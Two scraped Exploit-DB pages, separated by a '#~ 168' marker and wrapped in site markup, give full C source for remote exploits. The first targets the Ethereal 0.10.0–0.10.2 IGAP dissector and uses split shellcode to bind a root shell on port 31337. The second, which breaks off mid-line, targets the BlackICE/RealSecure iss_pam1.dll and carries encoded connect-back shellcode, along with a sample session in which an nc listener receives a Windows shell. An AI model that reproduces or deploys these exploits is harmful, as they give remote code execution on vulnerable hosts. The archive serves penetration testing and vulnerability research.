Ethereal 0.10.0 < 0.10.2 - IGAP Overflow - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDEthereal 0.10.0 < 0.10.2 - IGAP OverflowEDB-ID:167CVE:2004-0176EDB Verified:Author:Abhisek DattaType:remoteExploit:/Platform:LinuxDate:2004-03-28Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** THE EYE ON SECURITY RESEARCH GROUP - INDIA* Ethereal IGAP Dissector Message Overflow Remote Root exploit** Copyright 2004 - EOS-India Group** Authors note:* Shellcode splitting technique:* Due to difficulty involved while following normal exploitation techniques due to shortage of memory space* for our shellcode, we used the technique of shellcode splitting. In this technique one part of the shellcode* is kept before the buffer which overwrites the saved EIP on stack followed by a jmp OFFSET instruction which* jumps EIP to the second half of the shellcode which is kept after return address. Also since our shellcode* requires EBP to contain a usuable stack address, we overwrite saved EBP also.** Disclaimer:* This code is for educational purpose and testing only. The Eye on Security Research Group - India, cannot* be held responsible for any damage caused due to misuse of this code.* This code is a proof of concept exploit for a serious vulnerability that exists in Ethereal 0.10.0 to* Ethereal 0.10.2.** Nilanjan De [n2n+linuxmail.org] - Abhisek Datta [abhisek+front.ru]* http://www.eos-india.net**/#define IPPROTO_IGAP	0x02 // IPPROTO_IGMP=0x02#define PAYLOAD_SIZE	(255-64)#define MAX_BUFF	sizeof(struct igap_header)+sizeof(struct ipheader)#define EXP		"Ethereal(v0.10.0-0.10.2) IGAP Dissector Message Overflow Exploit"#define VER		"0.2"#define SOCKET_ERROR	-1#define MAX_PACKET	10#define RETOFFSET 	76#define SRC_IP		"192.31.33.7"#include <stdio.h>#include <signal.h>#include <sys/socket.h>#include <sys/types.h>#include <unistd.h>#include <signal.h>#include <netdb.h>#define MAX_ARCH	5struct eos{char *arch;unsigned long ret;} targets[] = {"tEthereal(0.10.2)-Gentoo(gdb)",0xbffede50,//-------------------------------"tEthereal(0.10.2)-Gentoo     ",0xbffede10,//-------------------------------"Ethereal(0.10.2)-Gentoo      ",0xbfffd560,//-------------------------------"tEthereal(0.10.2)-RedHat 8   ",0xbffedfb8,//-------------------------------"Ethereal(0.10.2)-RedHat 8    ",0xbfffcd08,//-------------------------------NULL,0};/*x86 linux portbind a shell in port 31337based on shellcode from www.shellcode.com.arwith a few modifications by us*/char shellcode_firsthalf[]=/* sys_fork() */"\x31\xc0"                      // xorl         %eax,%eax"\x31\xdb"                      // xorl         %ebx,%ebx"\xb0\x02"                      // movb         $0x2,%al"\xcd\x80"                      // int          $0x80"\x38\xc3"                      // cmpl         %ebx,%eax"\x74\x05"                      // je           0x5/* sys_exit() */"\x8d\x43\x01"                  // leal         0x1(%ebx),%eax"\xcd\x80"                      // int          $0x80/* setuid(0) */"\x31\xc0"                      // xorl         %eax,%eax"\x31\xdb"                      // xorl         %ebx,%ebx"\xb0\x17"                      // movb         $0x17,%al"\xcd\x80"                      // int          $0x80/* socket() */"\x31\xc0"                      // xorl    %eax,%eax"\x89\x45\x10"                  // movl    %eax,0x10(%ebp)(IPPROTO_IP = 0x0)"\x40"                          // incl    %eax"\x89\xc3"                      // movl    %eax,%ebx(SYS_SOCKET = 0x1)"\x89\x45\x0c"                  // movl    %eax,0xc(%ebp)(SOCK_STREAM = 0x1)"\x40"                          // incl    %eax"\x89\x45\x08"                  // movl    %eax,0x8(%ebp)(AF_INET = 0x2)"\x8d\x4d\x08"                  // leal    0x8(%ebp),%ecx"\xb0\x66"                      // movb    $0x66,%al"\xcd\x80"                      // int     $0x80"\x89\x45\x08"                  // movl    %eax,0x8(%ebp);char jumpcode[]="\xeb\x10";char shellcode_secondhalf[]=/* bind()*/"\x43"                          // incl    %ebx(SYS_BIND = 0x2)"\x66\x89\x5d\x14"              // movw    %bx,0x14(%ebp)(AF_INET = 0x2)"\x66\xc7\x45\x16\x7a\x69"      // movw    $0x697a,0x16(%ebp)(port=31337)"\x31\xd2"                      // xorl    %edx,%edx"\x89\x55\x18"                  // movl    %edx,0x18(%ebp)"\x8d\x55\x14"                  // leal    0x14(%ebp),%edx"\x89\x55\x0c"                  // movl    %edx,0xc(%ebp)"\xc6\x45\x10\x10"              // movb    $0x10,0x10(%ebp)(sizeof(struct sockaddr) = 10h = 16)"\xb0\x66"                      // movb    $0x66,%al"\xcd\x80"                      // int     $0x80/* listen() */"\x40"                          // incl    %eax"\x89\x45\x0c"                  // movl    %eax,0xc(%ebp)"\x43"                          // incl    %ebx"\x43"                          // incl    %ebx(SYS_LISTEN = 0x4)"\xb0\x66"                      // movb    $0x66,%al"\xcd\x80"                      // int     $0x80/* accept() */"\x43"                          // incl    %ebx"\x89\x45\x0c"                  // movl    %eax,0xc(%ebp)"\x89\x45\x10"                  // movl    %eax,0x10(%ebp)"\xb0\x66"                      // movb    $0x66,%al"\xcd\x80"                      // int     $0x80"\x89\xc3"                      // movl    %eax,%ebx/* dup2() */"\x31\xc9"                      // xorl    %ecx,%ecx"\xb0\x3f"                      // movb    $0x3f,%al"\xcd\x80"                      // int     $0x80"\x41"                          // incl    %ecx"\x80\xf9\x03"                  // cmpb    $0x3,%cl"\x75\xf6"                      // jne     -0xa/* execve() */"\x31\xd2"                      // xorl    %edx,%edx"\x52"                          // pushl   %edx"\x68\x6e\x2f\x73\x68"          // pushl   $0x68732f6e"\x68\x2f\x2f\x62\x69"          // pushl   $0x69622f2f"\x89\xe3"                      // movl    %esp,%ebx"\x52"                          // pushl   %edx"\x53"                          // pushl   %ebx"\x89\xe1"                      // movl    %esp,%ecx"\xb0\x0b"                      // movb    $0xb,%al"\xcd\x80";                     // int     $0x80struct ipheader {unsigned char ip_hl:4, ip_v:4;unsigned char ip_tos;unsigned short int ip_len;unsigned short int ip_id;unsigned short int ip_off;unsigned char ip_ttl;unsigned char ip_proto;unsigned short int ip_sum;unsigned int ip_src;unsigned int ip_dst;};struct igap_header { 		// This is a malformed header which does not conforms with IGAP RFCunsigned char igap_type; 	// Message Typeunsigned char igap_restime; 	// Response Timeunsigned short int igap_cksum; 	// IGAP Message Checksumunsigned int igap_gaddr; 	// Group Addressunsigned char igap_ver; 	// Versionunsigned char igap_stype;	// SubTypeunsigned char igap_reserved1;	// Reservedunsigned char igap_cid;		// Challenge IDunsigned char igap_asize;	// Account Sizeunsigned char igap_msgsize;	// Message Sizeunsigned short int igap_reserved2;	// Reserved/*unsigned char igap_uaccount[16];// User Accountunsigned char igap_message[64]	// Message*/unsigned char igap_payload[16+64+PAYLOAD_SIZE];// This buffer will contain payload, here we differ from RFC by sending a bigger message.};unsigned short checksum(unsigned short *buf,int nwords){unsigned long sum;for (sum = 0; nwords > 0; nwords--)sum += *(buf)++;sum = (sum >> 16) + (sum & 0xffff);sum += (sum >> 16);return ~sum;}void showhelp(char *pr00gie) {int i=0;printf("######### The Eye on Security Research Group - India ########\n");printf("%s %s\n",EXP,VER);printf("abhisek[at]front[dot]ru - n2n[at]linuxmail[dot]org\n");printf("http://www.eos-india.net\n\n");printf("[usage]\n");printf("%s [Remote Host] [Target]\n",pr00gie);printf("[Available Targets]\n");while(targets[i].arch != NULL) {printf("%d. - %s\t - %p\n",(i),targets[i].arch,targets[i].ret);i++;}exit(1);}int main(int argc,char *argv[]) {char buffer[MAX_BUFF];struct ipheader *iphdr=(struct ipheader*)buffer;struct igap_header *igaphdr=(struct igap_header*)(buffer+sizeof(struct ipheader));int sockfd;unsigned long addr;int one=1;int i;const int *val=&one;struct sockaddr_in sin;unsigned long magic;unsigned int n;if(getuid()) {printf("- This code opens SOCK_RAW which needs root privilege\n");exit(1);}if(argc != 3)showhelp(argv[0]);n=atoi(argv[2]);if(n >= MAX_ARCH) {printf("- Invalid target\n");showhelp(argv[0]);}magic=targets[n].ret;printf("-Using RET %p\n",magic);addr=inet_addr(argv[1]);if(addr==INADDR_NONE) {printf("- Invalid target\n");exit(1);}sin.sin_addr.s_addr=addr;sin.sin_family=AF_INET;sin.sin_port=0x00;sockfd=socket(PF_INET,SOCK_RAW,IPPROTO_RAW);if(sockfd==SOCKET_ERROR) {printf("- Failed creating SOCK_RAW descriptor\n");exit(1);}if(setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,val,sizeof(one)) < 0)printf ("- WARNING !! :Cannot set IP_HDRINCL!\n");memset(buffer,0x00,MAX_BUFF);// Filling IP Headeriphdr->ip_hl=0x05;iphdr->ip_v=0x04;iphdr->ip_tos=0x00;iphdr->ip_len=MAX_BUFF;iphdr->ip_id=htonl(54321);iphdr->ip_off=0x00; // Lower 3 bit=Flag4Fragmentation - Higher 13 Bit=Fragment Offsetiphdr->ip_ttl=0x01;iphdr->ip_proto=IPPROTO_IGAP; // IPPROTO_IGMPiphdr->ip_sum=0x00; // Fill sum before sending packetiphdr->ip_src=inet_addr (SRC_IP);iphdr->ip_dst=addr;// Filling IGAP Headerigaphdr->igap_type=0x41; // IGAP Membership Queryigaphdr->igap_restime=0x0a; //igaphdr->igap_cksum=0x00; // compute before sending packetigaphdr->igap_gaddr=0x00; // Ignored in IGAP Membership Query Messageigaphdr->igap_ver=0x01; // IGAPv1igaphdr->igap_stype=0x21; // Basic Queryigaphdr->igap_reserved1=0x00; // Ignoredigaphdr->igap_cid=0x00;// Challenge ID (ignored because Chanllenge Response authentication not used)igaphdr->igap_asize=0x10; // MAX Size of Account Name Fieldigaphdr->igap_msgsize=0x40+PAYLOAD_SIZE; //  Size of Messageigaphdr->igap_reserved2=0x00; // Reserved// Building exploit buffer//for(i=0;i<16+64+PAYLOAD_SIZE;i++)//	memset(igaphdr->igap_payload+i,(unsigned char)i,1);memset(igaphdr->igap_payload,0x90,16+64+PAYLOAD_SIZE);memcpy(igaphdr->igap_payload+16+RETOFFSET-strlen(shellcode_firsthalf)-8,shellcode_firsthalf,strlen(shellcode_firsthalf));memcpy(igaphdr->igap_payload+16+64+RETOFFSET-strlen(jumpcode)-4,jumpcode,strlen(jumpcode));memcpy(igaphdr->igap_payload+16+64+RETOFFSET,&magic,4);magic-=0x10;memcpy(igaphdr->igap_payload+16+64+RETOFFSET-4,&magic,4);memcpy(igaphdr->igap_payload+16+64+PAYLOAD_SIZE-strlen(shellcode_secondhalf)-1,shellcode_secondhalf,strlen(shellcode_secondhalf));// Calculating checksumigaphdr->igap_cksum=checksum((unsigned short*)(buffer+sizeof(struct ipheader)),(sizeof(struct igap_header))>>1);iphdr->ip_sum = checksum ((unsigned short*)buffer,(iphdr->ip_len)>>1);// Sendingone=MAX_PACKET;while(one) {sendto(sockfd,buffer,MAX_BUFF,0,(struct sockaddr*)&sin,sizeof(sin));printf(".");one--;}close(sockfd);printf("\n- Send %d packets to %s\n",MAX_PACKET,argv[1]);printf("- Read source to know what to do to check if the exploit worked\n");return 0;}// milw0rm.com [2004-03-28]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 168
RealSecure / Blackice - 'iss_pam1.dll' Remote Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDRealSecure / Blackice - 'iss_pam1.dll' Remote OverflowEDB-ID:168CVE:2004-0362EDB Verified:Author:SamType:remoteExploit:/Platform:WindowsDate:2004-03-28Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* 557iss_pam_exp - RealSecure / Blackice ICQ iss_pam1.dll remote overflow exploit** Copyright (c) SST 2004 All rights reserved.** Public version** code by Sam (Sam`@efnet) and 2004/03/26* <chen_xiaobo@venustech.com.cn>* <Sam@0x557.org>**** Compile: gcc -o 557iss_pam_exp 557iss_pam_exp.c** how works?* [root@core exp]# ./557iss_pam_exp 192.168.10.2 192.168.10.169 5570* 557iss_pam_exp - RealSecure / Blackice iss_pam1.dll remote overflow exploit* - Sam** # attack remote host: 192.168.10.2.* # listen host: 192.168.10.169.* # listen port: 5570.* # send overflow udp datas* # 1199 bytes send* # done.* # make sure we are in, dude :)*** [root@core root]# nc -vv -l -p 5570* listening on [any] 5570 ...* 192.168.10.2: inverse host lookup failed: Host name lookup failure* connect to [192.168.10.169] from (UNKNOWN) [192.168.10.2] 3604* Microsoft Windows XP [Version 5.1.2600]* (C) Copyright 1985-2001 Microsoft Corp.** C:\Program Files\ISS\BlackICE>* C:\Program Files\ISS\BlackICE>* C:\Program Files\ISS\BlackICE>*** some thanks/greets to:* eeye (they find this bug :D), airsupply, kkqq, icbm, my gf :I* and everyone else who's KNOW SST ;P* http://0x557.org*/#include <stdio.h>#include <unistd.h>#include <stdarg.h>#include <sys/types.h>#include <sys/socket.h>#include <netinet/in.h>#include <netinet/tcp.h>#include <arpa/inet.h>#include <netdb.h>#include <stdlib.h>#include <errno.h>#include <string.h>#include <assert.h>#include <fcntl.h>#include <sys/time.h>char icq_header [] ="\x05\x00" // ICQ VERSION"\x00" // unused"\x00\x00\x00\x00" // Session ID"\x12\x02" // reply to SRV_MULTI_PACKET"\x00\x00\x00\x00" // SEQ_NUM1 and SEQ_NUM2"\x00\x00\x00\x00" // UIN Your (the client's) UIN"\x00\x00\x00\x00" // CHECKCODE"\x02" // SRV_MULTI Parameter Block 1 of 2// Number of individual responses"\x2c\x00" // Size of sub-response (44 bytes, little-endian)"\x05\x00" // ICQ VERSION"\x00" // unused"\x00\x00\x00\x00" // Session ID"\x6e\x00" // reply to SRV_USER_OLINE"\x00\x00\x00\x00" // SEQ_NUM1 and SEQ_NUM2"\x00\x00\x00\x00" // UIN Your (the client's) UIN"\x00\x00\x00\x00" // CHECKCODE"\x00\x00\x00\x00" // UIN of user changing status"\x01\x00\x00\x00" // Other user's IP address (1.0.0.0)"\x00\x00\x00\x00" // Other user's direct-connect port (default)"\x00""\x00\x00\x00\x00""\x00\x00\x00\x00""\x00\x00""\x41\x02" // SRV_MULTI Parameter Block 2 of 2// Size of sub-response (577 bytes)"\x05\x00" // ICQ VERSION"\x00" // unused"\x00\x00\x00\x00" // Session ID"\xde\x03" // reply to SRV_META_USER"\x00\x00\x00\x00" // SEQ_NUM1 and SEQ_NUM2"\x00\x00\x00\x00" // UIN Your (the client's) UIN"\x00\x00\x00\x00" // CHECKCODE"\x00\x00\x00\x01""\x00\x00\x01\x00""\x00\x01\x00\x00""\x1e\x02";struct sockaddr_in addr, local;char *bindHost = NULL;unsigned short port;/** hsj's connect back shellcodes*/char shellcode [] =/* decoder */"\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1b\x8d\xa0\x01""\xfc\xff\xff\x83\xe4\xfc\x8b\xec\x33\xc9\x66\xb9\x99\x01\x80\x30""\x93\x40\xe2\xfa"/* code */"\x7b\xe4\x93\x93\x93\xd4\xf6\xe7\xc3\xe1\xfc\xf0\xd2\xf7\xf7\xe1""\xf6\xe0\xe0\x93\xdf\xfc\xf2\xf7\xdf\xfa\xf1\xe1\xf2\xe1\xea\xd2""\x93\xd0\xe1\xf6\xf2\xe7\xf6\xc3\xe1\xfc\xf0\xf6\xe0\xe0\xd2\x93""\xd0\xff\xfc\xe0\xf6\xdb\xf2\xfd\xf7\xff\xf6\x93\xd6\xeb\xfa\xe7""\xc7\xfb\xe1\xf6\xf2\xf7\x93\xe4\xe0\xa1\xcc\xa0\xa1\x93\xc4\xc0""\xd2\xc0\xe7\xf2\xe1\xe7\xe6\xe3\x93\xc4\xc0\xd2\xc0\xfc\xf0\xf8""\xf6\xe7\xd2\x93\xf0\xff\xfc\xe0\xf6\xe0\xfc\xf0\xf8\xf6\xe7\x93""\xf0\xfc\xfd\xfd\xf6\xf0\xe7\x93\xf0\xfe\xf7\x93\xc9\xc1\x28\x93""\x93\x63\xe4\x12\xa8\xde\xc9\x03\x93\xe7\x90\xd8\x78\x66\x18\xe0""\xaf\x90\x60\x18\xe5\xeb\x90\x60\x18\xed\xb3\x90\x68\x18\xdd\x87""\xc5\xa0\x53\xc4\xc2\x18\xac\x90\x68\x18\x61\xa0\x5a\x22\x9d\x60""\x35\xca\xcc\xe7\x9b\x10\x54\x97\xd3\x71\x7b\x6c\x72\xcd\x18\xc5""\xb7\x90\x40\x42\x73\x90\x51\xa0\x5a\xf5\x18\x9b\x18\xd5\x8f\x90""\x50\x52\x72\x91\x90\x52\x18\x83\x90\x40\xcd\x18\x6d\xa0\x5a\x22""\x97\x7b\x08\x93\x93\x93\x10\x55\x98\xc1\xc5\x6c\xc4\x63\xc9\x18""\x4b\xa0\x5a\x22\x97\x7b\x14\x93\x93\x93\x10\x55\x9b\xc6\xfb\x92""\x92\x93\x93\x6c\xc4\x63\x16\x53\xe6\xe0\xc3\xc3\xc3\xc3\xd3\xc3""\xd3\xc3\x6c\xc4\x67\x10\x6b\x6c\xe7\xf0\x18\x4b\xf5\x54\xd6\x93""\x91\x93\xf5\x54\xd6\x91\x28\x39\x54\xd6\x97\x4e\x5f\x28\x39\xf9""\x83\xc6\xc0\x6c\xc4\x6f\x16\x53\xe6\xd0\xa0\x5a\x22\x82\xc4\x18""\x6e\x60\x38\xcc\x54\xd6\x93\xd7\x93\x93\x93\x1a\xce\xaf\x1a\xce""\xab\x1a\xce\xd3\x54\xd6\xbf\x92\x92\x93\x93\x1e\xd6\xd7\xc3\xc6""\xc2\xc2\xc2\xd2\xc2\xda\xc2\xc2\xc5\xc2\x6c\xc4\x77\x6c\xe6\xd7""\x6c\xc4\x7b\x6c\xe6\xdb\x6c\xc4\x7b\xc0\x6c\xc4\x6b\xc3\x6c\xc4""\x7f\x19\x95\xd5\x17\x53\xe6\x6a\xc2\xc1\xc5\xc0\x6c\x41\xc9\xca""\x1a\x94\xd4\xd4\xd4\xd4\x71\x7a\x50";/* udpconnect:**/int udpConnect (char *hostName){struct hostent* host = NULL;int sock = -1;host = gethostbyname (hostName);if (NULL == host) {perror ("gethostbyname() failed");return -1;}sock = socket (AF_INET, SOCK_DGRAM, IPPROTO_UDP);if ( -1 == sock) {perror ("socket() failed\n");return -1;}memset (&addr, 0x00, sizeof (addr));addr.sin_addr = *(struct in_addr *) host->h_addr;addr.sin_family = AF_INET;addr.sin_port = htons(random());memset (&local, 0x00, sizeof (local));local.sin_family = AF_INET;local.sin_addr.s_addr = htonl (INADDR_ANY);local.sin_port = htons(4000);if (bind (sock, (struct sockaddr *) &local, sizeof(local)) != 0) {perror ("bind error\n");return -1;}return sock;}/* resolve listen host*/unsigned int resolve (char *name){struct hostent *he;unsigned int ip;if ((ip = inet_addr (name)) == (-1)) {if ((he = gethostbyname (name)) ==0 )return 0;memcpy (&ip, he->h_addr, 4);}return ip;}/** send datas*/int udp_send (int sock, char *buffer, int buff_len){int ret;ret = sendto (sock, buffer, buff_len, 0, (struct sockaddr *)&addr,sizeof (struct sockaddr_in));if (ret <= NULL) {perror ("sendto failed\n");return -1;}fprintf (stderr, "# %d bytes send\n", ret);return ret;}/** send evil datas, fuck ISS's blackice.*/int do_sendudp_data (char *hostName){unsigned int cb;int sock;char expbuf[1200];memset (expbuf, 0x90, sizeof (expbuf));memcpy (expbuf, icq_header, sizeof (icq_header) - 1);/** jmp esp opcodes from iss_pam1.dll*/*(unsigned int *)&expbuf[637] = 0x5e077663;if (!(cb = resolve (bindHost))) {printf ("Unknown listen host\n");return -1;}port = htons (port);port ^= 0x9393;cb ^= 0x93939393;*(unsigned short *)&shellcode[330] = port;*(unsigned int *)&shellcode[335] = cb;memcpy (expbuf + 637 + 4, shellcode, strlen (shellcode));if ((sock = udpConnect (hostName)) < 0) {printf ("connect failed\n");exit (-1);}fprintf (stderr, "# send overflow udp datas\n");udp_send (sock, expbuf, sizeof (expbuf) - 1);close (sock);return 0;}/** just main . dude.*/int main (int argc, char **argv){int new;char *target = NULL;fprintf (stderr, "557iss_pam_exp - RealSecure / Blackice iss_pam1.dll remote overflow exploit\n - Sam\n\n");if (argc != 4) {fprintf (stderr, "%s <hostname> <listenhost> <listen port>\n", argv[0]);fprintf (stderr, "listenhost, port: connect back host and port\n\n");return -1;}target = argv[1];bindHost = argv[2];port = atoi (argv[3]);fprintf (stderr, "# attack remote host: %s. \n", target);fprintf (stderr, "# listen host: %s. \n", bindHost);fprintf (stderr, "# 